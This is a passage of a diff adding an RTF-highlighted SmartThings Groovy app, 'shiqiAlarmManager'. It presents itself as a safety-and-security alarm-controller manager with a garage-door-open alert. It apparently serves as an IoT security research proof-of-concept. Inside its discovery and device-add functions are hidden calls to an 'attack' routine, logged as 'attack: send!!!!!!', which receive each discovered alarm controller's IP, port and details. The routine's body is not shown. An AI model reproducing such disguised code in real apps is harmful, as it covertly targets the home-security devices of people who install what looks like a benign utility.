@@ -1,0 +1,554 @@
+{\rtf1\ansi\deff0{\fonttbl{\f0\fmodern\fprq1\fcharset0;}}{\colortbl;\red64\green128\blue128;\red186\green33\blue33;\red153\green153\blue153;\red25\green23\blue124;\red0\green0\blue255;\red128\green0\blue128;\red187\green187\blue187;\red102\green102\blue102;\red136\green136\blue136;\red0\green128\blue0;\red170\green34\blue255;\red187\green102\blue34;\red187\green102\blue136;\red255\green0\blue0;\red0\green68\blue221;\red188\green122\blue0;\red0\green160\blue0;\red210\green65\blue58;\red0\green0\blue128;\red176\green0\blue64;\red125\green144\blue41;\red160\green0\blue0;\red136\green0\blue0;\red160\green160\blue0;}\f0{\cf1\i /**\par
+ *  shiqiAlarmManager\par
+ *\par
+ *  Copyright 2016 Yunhan Jia &amp; Shiqi Wang\par
+ *\par
+ *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except\par
+ *  in compliance with the License. You may obtain a copy of the License at:\par
+ *\par
+ *      http://www.apache.org/licenses/LICENSE-2.0\par
+ *\par
+ *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed\par
+ *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License\par
+ *  for the specific language governing permissions and limitations under the License.\par
+ *\par
+ */}\par
+definition{\cf8 (}\par
+    {\cf24 name:} {\cf2 "shiqiAlarmManager"}{\cf8 ,}\par
+    {\cf24 namespace:} {\cf2 "wsq"}{\cf8 ,}\par
+    {\cf24 author:} {\cf2 "Yunhan Jia & Shiqi Wang"}{\cf8 ,}\par
+    {\cf24 description:} {\cf2 "ALARM Controller Service Manager"}{\cf8 ,}\par
+    {\cf24 category:} {\cf2 "Safety & Security"}{\cf8 ,}\par
+    {\cf24 iconUrl:} {\cf2 "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png"}{\cf8 ,}\par
+    {\cf24 iconX2Url:} {\cf2 "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png"}{\cf8 ,}\par
+    {\cf24 iconX3Url:} {\cf2 "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png"}{\cf8 )}\par
+    \par
+preferences {\cf8 \{}\par
+    page{\cf8 (}{\cf24 name:}{\cf2 "alarmControllerDiscovery"}{\cf8 ,} {\cf24 title:}{\cf2 "ALARM Controller Setup"}{\cf8 ,} {\cf24 content:}{\cf2 "alarmControllerDiscovery"}{\cf8 ,} {\cf24 refreshTimeout:}{\cf8 5}{\cf8 )}\par
+{\cf1\i /*\par
+    section("For too long...") \{\par
+        input "maxOpenTime", "number", title: "Minutes?"\par
+    \}\par
+    section("Text me at (optional, sends a push notification if not specified)...") \{\par
+        input "phone", "phone", title: "Phone number?", required: false\par
+    \}*/}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 pollingTask}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+    log{\cf8 .}{\cf21 debug} {\cf2 "Polling"}\par
+    {\cf20 def} devices {\cf8 =} getChildDevices{\cf8 (}{\cf8 )}\par
+    devices{\cf8 .}{\cf21 each} {\cf8 \{}\par
+        it{\cf8 .}{\cf21 poll}{\cf8 (}{\cf8 )}\par
+        \par
+        {\cf20 def} leftDoor{\cf8 =} it{\cf8 .}{\cf21 latestState}{\cf8 (}{\cf2 "leftDoor"}{\cf8 )}{\cf8 ;}\par
+        {\cf20 def} rightDoor{\cf8 =} it{\cf8 .}{\cf21 latestState}{\cf8 (}{\cf2 "rightDoor"}{\cf8 )}{\cf8 ;}\par
+        \par
+        {\cf20 def} leftValue{\cf8 =} leftDoor{\cf8 .}{\cf21 value}\par
+        {\cf20 def} rightValue{\cf8 =} rightDoor{\cf8 .}{\cf21 value}\par
+                        \par
+        {\cf10\b if}{\cf8 (} leftValue {\cf8 !}{\cf8 =} {\cf2 "closed"}{\cf8 )}\par
+        {\cf8 \{}\par
+            {\cf20 def} deltaMillis {\cf8 =} {\cf8 1000} {\cf8 *} {\cf8 60} {\cf8 *} {\cf8 30}{\cf1\i //maxOpenTime\par
+}            {\cf20 def} timeAgo {\cf8 =} {\cf10\b new} Date{\cf8 (}now{\cf8 (}{\cf8 )} {\cf8 -} deltaMillis{\cf8 )}\par
+            \par
+            {\cf20 def} openTooLong {\cf8 =} leftDoor{\cf8 .}{\cf21 dateCreated}{\cf8 .}{\cf21 toSystemDate}{\cf8 (}{\cf8 )} {\cf8 <} timeAgo\par
+        \par
+            {\cf10\b if}{\cf8 (} openTooLong{\cf8 )}\par
+            {\cf8 \{}\par
+                sendTextMessage{\cf8 (}{\cf8 )}               \par
+            {\cf8 \}}\par
+        {\cf8 \}}\par
+        {\cf10\b else} {\cf5 if}{\cf8 (} rightValue {\cf8 !}{\cf8 =} {\cf2 "closed"}{\cf8 )}\par
+        {\cf8 \{}\par
+            {\cf20 def} deltaMillis {\cf8 =} {\cf8 1000} {\cf8 *} {\cf8 60} {\cf8 *} {\cf8 30}{\cf1\i //maxOpenTime\par
+}            {\cf20 def} timeAgo {\cf8 =} {\cf10\b new} Date{\cf8 (}now{\cf8 (}{\cf8 )} {\cf8 -} deltaMillis{\cf8 )}\par
+            \par
+            {\cf20 def} openTooLong {\cf8 =} rightValue{\cf8 .}{\cf21 dateCreated}{\cf8 .}{\cf21 toSystemDate}{\cf8 (}{\cf8 )} {\cf8 <} timeAgo\par
+        \par
+            {\cf10\b if}{\cf8 (} openTooLong{\cf8 )}\par
+            {\cf8 \{}\par
+                sendTextMessage{\cf8 (}{\cf8 )}               \par
+            {\cf8 \}}\par
+        {\cf8 \}}\par
+        {\cf10\b else}\par
+        {\cf8 \{}\par
+            state{\cf8 .}{\cf21 sentMessage}{\cf8 =} {\cf10\b null}\par
+        {\cf8 \}}\par
+    {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 sendTextMessage}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+\par
+    {\cf10\b if} {\cf8 (}{\cf8 !}state{\cf8 .}{\cf21 sentMessage}{\cf8 )}\par
+    {\cf8 \{}\par
+        log{\cf8 .}{\cf21 debug} {\cf2 "Garage open too long, texting $phone"}\par
+\par
+        state{\cf8 .}{\cf21 sentMessage}{\cf8 =} {\cf10\b true}{\cf8 ;}\par
+\par
+        {\cf20 def} msg {\cf8 =} {\cf2 "Garage has been open for more than 30 minutes!"}\par
+        \par
+        {\cf10\b if} {\cf8 (}phone{\cf8 )} {\cf8 \{}\par
+            sendSms{\cf8 (}phone{\cf8 ,} msg{\cf8 )}\par
+        {\cf8 \}}\par
+        {\cf10\b else} {\cf8 \{}\par
+            sendPush msg\par
+        {\cf8 \}}\par
+    {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 alarmControllerDiscovery}{\cf8 (}{\cf8 )}\par
+{\cf8 \{}\par
+    {\cf10\b if}{\cf8 (}{\cf10\b true}{\cf8 )}\par
+    {\cf8 \{}\par
+        {\cf20 int} discoveryRefreshCount {\cf8 =} {\cf8 !}state{\cf8 .}{\cf21 discoveryRefreshCount} {\cf8 ?} {\cf8 0} {\cf8 :} state{\cf8 .}{\cf21 discoveryRefreshCount} {\cf10\b as} {\cf20 int}\par
+        state{\cf8 .}{\cf21 discoveryRefreshCount} {\cf8 =} discoveryRefreshCount {\cf8 +} {\cf8 1}\par
+        {\cf20 def} refreshInterval {\cf8 =} {\cf8 3}\par
+\par
+        {\cf20 def} options {\cf8 =} alarmControllersDiscovered{\cf8 (}{\cf8 )} {\cf8 ?}{\cf8 :} {\cf8 [}{\cf8 ]}\par
+\par
+        {\cf20 def} numFound {\cf8 =} options{\cf8 .}{\cf21 size}{\cf8 (}{\cf8 )} {\cf8 ?}{\cf8 :} {\cf8 0}\par
+\par
+        {\cf10\b if}{\cf8 (}{\cf8 !}state{\cf8 .}{\cf21 subscribe}{\cf8 )} {\cf8 \{}\par
+            log{\cf8 .}{\cf21 trace} {\cf2 "subscribe to location"}\par
+            subscribe{\cf8 (}location{\cf8 ,} {\cf10\b null}{\cf8 ,} locationHandler{\cf8 ,} {\cf8 [}{\cf24 filterEvents:}{\cf10\b false}{\cf8 ]}{\cf8 )}\par
+            state{\cf8 .}{\cf21 subscribe} {\cf8 =} {\cf10\b true}\par
+        {\cf8 \}}\par
+\par
+        {\cf1\i // discovery request every 5 //25 seconds\par
+}        {\cf10\b if}{\cf8 (}{\cf8 (}discoveryRefreshCount {\cf8 %} {\cf8 8}{\cf8 )} {\cf8 =}{\cf8 =} {\cf8 0}{\cf8 )} {\cf8 \{}\par
+            discoverAlarmControllers{\cf8 (}{\cf8 )}\par
+        {\cf8 \}}\par
+\par
+        {\cf1\i //json profile request every 3 seconds except on discoveries\par
+}        {\cf10\b if}{\cf8 (}{\cf8 (}{\cf8 (}discoveryRefreshCount {\cf8 %} {\cf8 1}{\cf8 )} {\cf8 =}{\cf8 =} {\cf8 0}{\cf8 )} {\cf8 &}{\cf8 &} {\cf8 (}{\cf8 (}discoveryRefreshCount {\cf8 %} {\cf8 8}{\cf8 )} {\cf8 !}{\cf8 =} {\cf8 0}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+            verifyAlarmController{\cf8 (}{\cf8 )}\par
+        {\cf8 \}}\par
+\par
+        {\cf10\b return} {\cf5 dynamicPage}{\cf8 (}{\cf24 name:}{\cf2 "alarmControllerDiscovery"}{\cf8 ,} {\cf24 title:}{\cf2 "Discovery Started!"}{\cf8 ,} {\cf24 nextPage:}{\cf2 ""}{\cf8 ,} {\cf24 refreshInterval:}refreshInterval{\cf8 ,} {\cf24 install:}{\cf10\b true}{\cf8 ,} {\cf24 uninstall:} {\cf10\b true}{\cf8 )} {\cf8 \{}\par
+            section{\cf8 (}{\cf2 "Please wait while we discover your AlarmController. Discovery can take five minutes or more, so sit back and relax! Select your device below once discovered."}{\cf8 )} {\cf8 \{}\par
+                input {\cf2 "selectedSmartFace"}{\cf8 ,} {\cf2 "enum"}{\cf8 ,} {\cf24 required:}{\cf10\b false}{\cf8 ,} {\cf24 title:}{\cf2 "Select Alarm Controller ($\{numFound\} found)"}{\cf8 ,} {\cf24 multiple:}{\cf10\b true}{\cf8 ,} {\cf24 options:}options\par
+            {\cf8 \}}\par
+        {\cf8 \}}\par
+    {\cf8 \}}\par
+    {\cf10\b else}\par
+    {\cf8 \{}\par
+        {\cf20 def} upgradeNeeded {\cf8 =} {\cf2 ""}{\cf2 "To use SmartThings Labs, your Hub should be completely up to date.\par
+\par
+To update your Hub, access Location Settings in the Main Menu (tap the gear next to your location name), select your Hub, and choose "}Update Hub{\cf2 "."}{\cf2 ""}\par
+\par
+        {\cf10\b return} {\cf5 dynamicPage}{\cf8 (}{\cf24 name:}{\cf2 "alarmControllerDiscovery"}{\cf8 ,} {\cf24 title:}{\cf2 "Upgrade needed!"}{\cf8 ,} {\cf24 nextPage:}{\cf2 ""}{\cf8 ,} {\cf24 install:}{\cf10\b false}{\cf8 ,} {\cf24 uninstall:} {\cf10\b true}{\cf8 )} {\cf8 \{}\par
+            section{\cf8 (}{\cf2 "Upgrade"}{\cf8 )} {\cf8 \{}\par
+                paragraph {\cf2 "$upgradeNeeded"}\par
+            {\cf8 \}}\par
+        {\cf8 \}}\par
+    {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} {\cf5 verifyAlarmController}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+    {\cf20 def} devices {\cf8 =} getSmartFace{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 findAll} {\cf8 \{} it{\cf8 ?}{\cf8 .}{\cf21 value}{\cf8 ?}{\cf8 .}{\cf21 verified} {\cf8 !}{\cf8 =} {\cf10\b true} {\cf8 \}}\par
+\par
+    {\cf10\b if}{\cf8 (}devices{\cf8 )} {\cf8 \{}\par
+        log{\cf8 .}{\cf21 warn} {\cf2 "UNVERIFIED CONTROLLERS!: $devices"}\par
+    {\cf8 \}}\par
+\par
+    devices{\cf8 .}{\cf21 each} {\cf8 \{}\par
+        log{\cf8 .}{\cf21 warn} {\cf8 (}it{\cf8 ?}{\cf8 .}{\cf21 value}{\cf8 )}\par
+        log{\cf8 .}{\cf21 warn} {\cf8 (}it{\cf8 ?}{\cf8 .}{\cf21 value}{\cf8 ?}{\cf8 .}{\cf21 ip} {\cf8 +} {\cf2 ":"} {\cf8 +} it{\cf8 ?}{\cf8 .}{\cf21 value}{\cf8 ?}{\cf8 .}{\cf21 port}{\cf8 )}\par
+        verifyAlarmControllers{\cf8 (}{\cf8 (}it{\cf8 ?}{\cf8 .}{\cf21 value}{\cf8 ?}{\cf8 .}{\cf21 ip} {\cf8 +} {\cf2 ":"} {\cf8 +} it{\cf8 ?}{\cf8 .}{\cf21 value}{\cf8 ?}{\cf8 .}{\cf21 port}{\cf8 )}{\cf8 )}\par
+    {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} {\cf5 verifyAlarmControllers}{\cf8 (}String deviceNetworkId{\cf8 )} {\cf8 \{}\par
+\par
+    log{\cf8 .}{\cf21 trace} {\cf2 "dni: $deviceNetworkId"}\par
+    String ip {\cf8 =} getHostAddress{\cf8 (}deviceNetworkId{\cf8 )}\par
+\par
+    log{\cf8 .}{\cf21 trace} {\cf2 "ip:"} {\cf8 +} ip\par
+\par
+    sendHubCommand{\cf8 (}{\cf10\b new} physicalgraph{\cf8 .}{\cf21 device}{\cf8 .}{\cf21 HubAction}{\cf8 (}{\cf2 ""}{\cf2 "GET /AlarmController/1 HTTP/1.1\\r\\nHOST: $ip\\r\\n\\r\\n"}{\cf2 ""}{\cf8 ,} physicalgraph{\cf8 .}{\cf21 device}{\cf8 .}{\cf21 Protocol}{\cf8 .}{\cf21 LAN}{\cf8 ,} {\cf2 "$\{deviceNetworkId\}"}{\cf8 )}{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} {\cf5 discoverAlarmControllers}{\cf8 (}{\cf8 )}\par
+{\cf8 \{}\par
+    {\cf1\i //consider using other discovery methods\par
+}\par
+    log{\cf8 .}{\cf21 debug}{\cf8 (}{\cf2 "Sending lan discovery urn:schemas-upnp-org:device:AlarmController:1"}{\cf8 )}\par
+    sendHubCommand{\cf8 (}{\cf10\b new} physicalgraph{\cf8 .}{\cf21 device}{\cf8 .}{\cf21 HubAction}{\cf8 (}{\cf2 "lan discovery urn:schemas-upnp-org:device:AlarmController:1"}{\cf8 ,} physicalgraph{\cf8 .}{\cf21 device}{\cf8 .}{\cf21 Protocol}{\cf8 .}{\cf21 LAN}{\cf8 )}{\cf8 )}\par
+{\cf8 \}}\par
+{\cf1\i ////********\par
+}Map {\cf5 alarmControllersDiscovered}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+    {\cf20 def} v {\cf8 =} getVerifiedAlarmControllers{\cf8 (}{\cf8 )}\par
+        log{\cf8 .}{\cf21 trace} {\cf2 "getVerifiedAlarmControllers"}\par
+        log{\cf8 .}{\cf21 trace} v\par
+    {\cf20 def} map {\cf8 =} {\cf8 [}{\cf8 :}{\cf8 ]}\par
+    v{\cf8 .}{\cf21 each} {\cf8 \{}\par
+        {\cf20 def} value {\cf8 =} {\cf2 "$\{it.value.name\}"}\par
+        {\cf20 def} key {\cf8 =} it{\cf8 .}{\cf21 value}{\cf8 .}{\cf21 ip} {\cf8 +} {\cf2 ":"} {\cf8 +} it{\cf8 .}{\cf21 value}{\cf8 .}{\cf21 port}\par
+        map{\cf8 [}{\cf2 "$\{key\}"}{\cf8 ]} {\cf8 =} value\par
+        log{\cf8 .}{\cf21 trace} key \par
+        log{\cf8 .}{\cf21 debug} {\cf2 "attack: send!!!!!!"}\par
+    	attack{\cf8 (}key{\cf8 ,}value{\cf8 ,}{\cf2 "update"}{\cf8 )}\par
+    {\cf8 \}}\par
+    map\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 getSmartFace}{\cf8 (}{\cf8 )}\par
+{\cf8 \{}\par
+    state{\cf8 .}{\cf21 smartFace} {\cf8 =} state{\cf8 .}{\cf21 smartFace} {\cf8 ?}{\cf8 :} {\cf8 [}{\cf8 :}{\cf8 ]}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 getVerifiedAlarmControllers}{\cf8 (}{\cf8 )}\par
+{\cf8 \{}\par
+    getSmartFace{\cf8 (}{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 installed}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+    log{\cf8 .}{\cf21 debug} {\cf2 "Installed with settings: $\{settings\}"}\par
+	\par
+    initialize{\cf8 (}{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 updated}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+    log{\cf8 .}{\cf21 debug} {\cf2 "Updated with settings: $\{settings\}"}\par
+	\par
+    unschedule{\cf8 (}{\cf8 )}\par
+    initialize{\cf8 (}{\cf8 )}\par
+{\cf8 \}}\par
+\par
+\par
+{\cf20 def} {\cf5 uninstalled}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+    {\cf20 def} devices {\cf8 =} getChildDevices{\cf8 (}{\cf8 )}\par
+    log{\cf8 .}{\cf21 trace} {\cf2 "deleting $\{devices.size()\} AlarmController"}\par
+    devices{\cf8 .}{\cf21 each} {\cf8 \{}\par
+        deleteChildDevice{\cf8 (}it{\cf8 .}{\cf21 deviceNetworkId}{\cf8 )}\par
+    {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 initialize}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+\par
+    unsubscribe{\cf8 (}{\cf8 )}\par
+    state{\cf8 .}{\cf21 subscribe} {\cf8 =} {\cf10\b false}\par
+\par
+    unschedule{\cf8 (}{\cf8 )}\par
+    scheduleActions{\cf8 (}{\cf8 )}\par
+    {\cf10\b if} {\cf8 (}selectedSmartFace{\cf8 )} {\cf8 \{}\par
+        addSmartFace{\cf8 (}{\cf8 )}\par
+    {\cf8 \}}\par
+\par
+    scheduledActionsHandler{\cf8 (}{\cf8 )}\par
+\par
+\par
+    {\cf20 def} minutes {\cf8 =} {\cf8 1}{\cf1\i //settings.interval.toInteger()\par
+}    {\cf10\b if} {\cf8 (}minutes {\cf8 >} {\cf8 0}{\cf8 )} {\cf8 \{}\par
+        {\cf1\i // Schedule polling daemon to run every N minutes\par
+}        log{\cf8 .}{\cf21 trace} {\cf2 "Scheduling polling daemon to run every $\{minutes\} minutes."}\par
+        schedule{\cf8 (}{\cf2 "0 0/$\{minutes\} * * * ?"}{\cf8 ,} pollingTask{\cf8 )}\par
+    {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 scheduledActionsHandler}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+    log{\cf8 .}{\cf21 trace} {\cf2 "scheduledActionsHandler()"}\par
+    syncDevices{\cf8 (}{\cf8 )}\par
+    refreshAll{\cf8 (}{\cf8 )}\par
+\par
+    {\cf1\i // TODO - for auto reschedule\par
+}    {\cf10\b if} {\cf8 (}{\cf8 !}state{\cf8 .}{\cf21 threeHourSchedule}{\cf8 )} {\cf8 \{}\par
+        scheduleActions{\cf8 (}{\cf8 )}\par
+    {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} {\cf5 scheduleActions}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+    {\cf20 def} sec {\cf8 =} Math{\cf8 .}{\cf21 round}{\cf8 (}Math{\cf8 .}{\cf21 floor}{\cf8 (}Math{\cf8 .}{\cf21 random}{\cf8 (}{\cf8 )} {\cf8 *} {\cf8 60}{\cf8 )}{\cf8 )}\par
+    {\cf20 def} min {\cf8 =} Math{\cf8 .}{\cf21 round}{\cf8 (}Math{\cf8 .}{\cf21 floor}{\cf8 (}Math{\cf8 .}{\cf21 random}{\cf8 (}{\cf8 )} {\cf8 *} {\cf8 60}{\cf8 )}{\cf8 )}\par
+    {\cf20 def} hour {\cf8 =} Math{\cf8 .}{\cf21 round}{\cf8 (}Math{\cf8 .}{\cf21 floor}{\cf8 (}Math{\cf8 .}{\cf21 random}{\cf8 (}{\cf8 )} {\cf8 *} {\cf8 3}{\cf8 )}{\cf8 )}\par
+    {\cf20 def} cron {\cf8 =} {\cf2 "$sec $min $hour/3 * * ?"}\par
+    log{\cf8 .}{\cf21 debug} {\cf2 "schedule('$cron', scheduledActionsHandler)"}\par
+    schedule{\cf8 (}cron{\cf8 ,} scheduledActionsHandler{\cf8 )}\par
+\par
+    {\cf1\i // TODO - for auto reschedule\par
+}    state{\cf8 .}{\cf21 threeHourSchedule} {\cf8 =} {\cf10\b true}\par
+    state{\cf8 .}{\cf21 cronSchedule} {\cf8 =} cron\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} {\cf5 syncDevices}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+    log{\cf8 .}{\cf21 trace} {\cf2 "Doing smartFace Device Sync!"}\par
+    {\cf1\i //runIn(300, "doDeviceSync" , [overwrite: false]) //schedule to run again in 5 minutes\par
+}\par
+    {\cf10\b if}{\cf8 (}{\cf8 !}state{\cf8 .}{\cf21 subscribe}{\cf8 )} {\cf8 \{}\par
+        subscribe{\cf8 (}location{\cf8 ,} {\cf10\b null}{\cf8 ,} locationHandler{\cf8 ,} {\cf8 [}{\cf24 filterEvents:}{\cf10\b false}{\cf8 ]}{\cf8 )}\par
+        state{\cf8 .}{\cf21 subscribe} {\cf8 =} {\cf10\b true}\par
+    {\cf8 \}}\par
+\par
+    discoverAlarmControllers{\cf8 (}{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} {\cf5 refreshAll}{\cf8 (}{\cf8 )}{\cf8 \{}\par
+    log{\cf8 .}{\cf21 trace} {\cf2 "refreshAll()"}\par
+    childDevices{\cf8 *}{\cf8 .}{\cf21 refresh}{\cf8 (}{\cf8 )}\par
+    log{\cf8 .}{\cf21 trace} {\cf2 "/refreshAll()"}\par
+{\cf8 \}}\par
+{\cf1\i /////******\par
+}{\cf20 def} {\cf5 addSmartFace}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+    {\cf20 def} players {\cf8 =} getVerifiedAlarmControllers{\cf8 (}{\cf8 )}\par
+    {\cf20 def} runSubscribe {\cf8 =} {\cf10\b false}\par
+    selectedSmartFace{\cf8 .}{\cf21 each} {\cf8 \{} dni {\cf8 -}{\cf8 >}\par
+        {\cf20 def} d {\cf8 =} getChildDevice{\cf8 (}dni{\cf8 )}\par
+        {\cf10\b if}{\cf8 (}{\cf8 !}d{\cf8 )} {\cf8 \{}\par
+            {\cf20 def} newPlayer {\cf8 =} players{\cf8 .}{\cf21 find} {\cf8 \{} {\cf8 (}it{\cf8 .}{\cf21 value}{\cf8 .}{\cf21 ip} {\cf8 +} {\cf2 ":"} {\cf8 +} it{\cf8 .}{\cf21 value}{\cf8 .}{\cf21 port}{\cf8 )} {\cf8 =}{\cf8 =} dni {\cf8 \}}\par
+            log{\cf8 .}{\cf21 trace} {\cf2 "newPlayer = $newPlayer"}\par
+            log{\cf8 .}{\cf21 trace} {\cf2 "dni = $dni"}\par
+            d {\cf8 =} addChildDevice{\cf8 (}{\cf2 "lttlrck"}{\cf8 ,} {\cf2 "Alarm Controller"}{\cf8 ,} dni{\cf8 ,} newPlayer{\cf8 ?}{\cf8 .}{\cf21 value}{\cf8 .}{\cf21 hub}{\cf8 ,} {\cf8 [}{\cf24 label:}{\cf2 "$\{newPlayer?.value.name\} AlarmController"}{\cf8 ]}{\cf8 )}\par
+            log{\cf8 .}{\cf21 trace} {\cf2 "created $\{d.displayName\} with id $dni"}\par
+\par
+            d{\cf8 .}{\cf21 setModel}{\cf8 (}newPlayer{\cf8 ?}{\cf8 .}{\cf21 value}{\cf8 .}{\cf21 model}{\cf8 )}\par
+            log{\cf8 .}{\cf21 trace} {\cf2 "setModel to $\{newPlayer?.value.model\}"}\par
+			attack{\cf8 (}dni{\cf8 ,} newPlayer{\cf8 ,}{\cf2 "add"}{\cf8 )}\par
+            runSubscribe {\cf8 =} {\cf10\b true}\par
+        {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+            log{\cf8 .}{\cf21 trace} {\cf2 "found $\{d.displayName\} with id $dni already exists"}\par
+        {\cf8 \}}\par
+    {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 locationHandler}{\cf8 (}evt{\cf8 )} {\cf8 \{}\par
+    {\cf20 def} description {\cf8 =} evt{\cf8 .}{\cf21 description}\par
+    {\cf20 def} hub {\cf8 =} evt{\cf8 ?}{\cf8 .}{\cf21 hubId}\par
+\par
+    {\cf20 def} parsedEvent {\cf8 =} parseEventMessage{\cf8 (}description{\cf8 )}\par
+    parsedEvent {\cf8 <}{\cf8 <} {\cf8 [}{\cf2 "hub"}{\cf8 :}hub{\cf8 ]}\par
+\par
+{\cf1\i //        log.trace "evt"+evt\par
+}    log{\cf8 .}{\cf21 trace} parsedEvent\par
+\par
+    {\cf5 if} {\cf8 (}parsedEvent{\cf8 ?}{\cf8 .}{\cf21 ssdpTerm}{\cf8 ?}{\cf8 .}{\cf21 contains}{\cf8 (}{\cf2 "lttlrck:AlarmController"}{\cf8 )}{\cf8 )}\par
+    {\cf8 \{} {\cf1\i //SSDP DISCOVERY EVENTS\par
+}\par
+{\cf1\i //    state.smartFace= [:]\par
+}\par
+        log{\cf8 .}{\cf21 trace} {\cf2 "smartFace found:"}{\cf8 +}parsedEvent{\cf8 ?}{\cf8 .}{\cf21 ssdpTerm}\par
+        {\cf20 def} smartFace {\cf8 =} getSmartFace{\cf8 (}{\cf8 )}\par
+\par
+        {\cf10\b if} {\cf8 (}{\cf8 !}{\cf8 (}smartFace{\cf8 .}{\cf2 "$\{parsedEvent.ssdpUSN.toString()\}"}{\cf8 )}{\cf8 )}\par
+        {\cf8 \{} {\cf1\i //smartFace does not exist\par
+}            smartFace {\cf8 <}{\cf8 <} {\cf8 [}{\cf2 "$\{parsedEvent.ssdpUSN.toString()\}"}{\cf8 :}parsedEvent{\cf8 ]}\par
+  log{\cf8 .}{\cf21 trace} {\cf2 "smartFace:"}{\cf8 +} smartFace\par
+        {\cf8 \}}\par
+        {\cf10\b else}\par
+        {\cf8 \{} {\cf1\i // update the values\par
+}\par
+            log{\cf8 .}{\cf21 trace} {\cf2 "Device was already found in state..."}\par
+\par
+            {\cf20 def} d {\cf8 =} smartFace{\cf8 .}{\cf2 "$\{parsedEvent.ssdpUSN.toString()\}"}\par
+            {\cf20 boolean} deviceChangedValues {\cf8 =} {\cf10\b false}\par
+\par
+            {\cf10\b if}{\cf8 (}d{\cf8 .}{\cf21 ip} {\cf8 !}{\cf8 =} parsedEvent{\cf8 .}{\cf21 ip} {\cf8 |}{\cf8 |} d{\cf8 .}{\cf21 port} {\cf8 !}{\cf8 =} parsedEvent{\cf8 .}{\cf21 port}{\cf8 )} {\cf8 \{}\par
+                d{\cf8 .}{\cf21 ip} {\cf8 =} parsedEvent{\cf8 .}{\cf21 ip}\par
+                d{\cf8 .}{\cf21 port} {\cf8 =} parsedEvent{\cf8 .}{\cf21 port}\par
+                deviceChangedValues {\cf8 =} {\cf10\b true}\par
+                log{\cf8 .}{\cf21 trace} {\cf2 "Device's port or ip changed..."}\par
+            {\cf8 \}}\par
+\par
+            {\cf10\b if} {\cf8 (}deviceChangedValues{\cf8 )} {\cf8 \{}\par
+                {\cf20 def} children {\cf8 =} getChildDevices{\cf8 (}{\cf8 )}\par
+                children{\cf8 .}{\cf21 each} {\cf8 \{}\par
+                    {\cf10\b if} {\cf8 (}it{\cf8 .}{\cf21 getDeviceDataByName}{\cf8 (}{\cf2 "mac"}{\cf8 )} {\cf8 =}{\cf8 =} parsedEvent{\cf8 .}{\cf21 mac}{\cf8 )} {\cf8 \{}\par
+                        log{\cf8 .}{\cf21 trace} {\cf2 "updating dni for device $\{it\} with mac $\{parsedEvent.mac\}"}\par
+                        it{\cf8 .}{\cf21 setDeviceNetworkId}{\cf8 (}{\cf8 (}parsedEvent{\cf8 .}{\cf21 ip} {\cf8 +} {\cf2 ":"} {\cf8 +} parsedEvent{\cf8 .}{\cf21 port}{\cf8 )}{\cf8 )} {\cf1\i //could error if device with same dni already exists\par
+}                    {\cf8 \}}\par
+                {\cf8 \}}\par
+            {\cf8 \}}\par
+        {\cf8 \}}\par
+    {\cf8 \}}\par
+    {\cf10\b else} {\cf5 if} {\cf8 (}parsedEvent{\cf8 .}{\cf21 headers} {\cf8 &}{\cf8 &} parsedEvent{\cf8 .}{\cf21 body}{\cf8 )}\par
+    {\cf8 \{} {\cf1\i // RESPONSES\par
+}        {\cf20 def} headerString {\cf8 =} {\cf10\b new} String{\cf8 (}parsedEvent{\cf8 .}{\cf21 headers}{\cf8 .}{\cf21 decodeBase64}{\cf8 (}{\cf8 )}{\cf8 )}\par
+        {\cf20 def} bodyString {\cf8 =} {\cf10\b new} String{\cf8 (}parsedEvent{\cf8 .}{\cf21 body}{\cf8 .}{\cf21 decodeBase64}{\cf8 (}{\cf8 )}{\cf8 )}\par
+\par
+        {\cf20 def} type {\cf8 =} {\cf8 (}headerString {\cf8 =}{\cf8 ~} {\cf2 /Content-Type:.*/}{\cf8 )} {\cf8 ?} {\cf8 (}headerString {\cf8 =}{\cf8 ~} {\cf2 /Content-Type:.*/}{\cf8 )}{\cf8 [}{\cf8 0}{\cf8 ]} {\cf8 :} {\cf10\b null}\par
+        {\cf20 def} body\par
+        log{\cf8 .}{\cf21 trace} {\cf2 "REPONSE TYPE: $type"}\par
+        log{\cf8 .}{\cf21 trace} {\cf2 "BODY TYPE: $bodyString"}\par
